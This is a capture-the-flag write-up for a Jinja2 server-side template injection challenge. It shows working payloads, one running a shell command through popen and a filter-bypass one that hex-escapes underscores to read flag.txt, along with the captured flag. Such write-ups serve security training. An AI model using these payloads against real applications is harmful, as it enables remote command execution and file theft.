# wafer

```
author: Lucian Ioan Nitescu
score: 50
solved: 67/94
difficulty: medium
tags: mics
```

## Description

Of course I included this protocol in my testing methodology and no vulnerabilities were found.

Flag format: CTF{sha256}

## Got the flag

When we connect to server, it response

```
nc 34.159.3.158 32077
GET /
Traceback (most recent call last):
  File "/home/ctf/server.py", line 8, in <module>
    print(Template("{{"+inputval+"}}").render())
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 1195, in __new__
    return env.from_string(source, template_class=cls)
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 1092, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 757, in compile
    self.handle_exception(source=source_hint)
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 925, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<unknown>", line 1, in template
jinja2.exceptions.TemplateSyntaxError: unexpected 'end of print statement'
```

So we think about SSTI in Jinja template and try injecting payload: 

```
nc 34.159.3.158 32077
''.__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()
Traceback (most recent call last):
  File "/home/ctf/server.py", line 8, in <module>
    print(Template("{{"+inputval+"}}").render())
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 1291, in render
    self.environment.handle_exception()
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 925, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<template>", line 1, in top-level template code
  File "/usr/local/lib/python3.9/dist-packages/jinja2/environment.py", line 474, in getattr
    return getattr(obj, attribute)
jinja2.exceptions.UndefinedError: 'str object' has no attribute 'class'
```
Based on result, we must bypass filter "_". 
After read this article "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection", we built the payload and try again.

```
nc 34.159.3.158 32077
()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(94)|attr('get\x5fdata')(0,'flag.txt')
b'CTF{3497acdc5cdb795851f334a6c8f401a1e2504b4d05283b6b599e7b6dc42cc200}\n'
```

## Conclusion

This challenge introduce how to bypass filter when exploit SSTI.


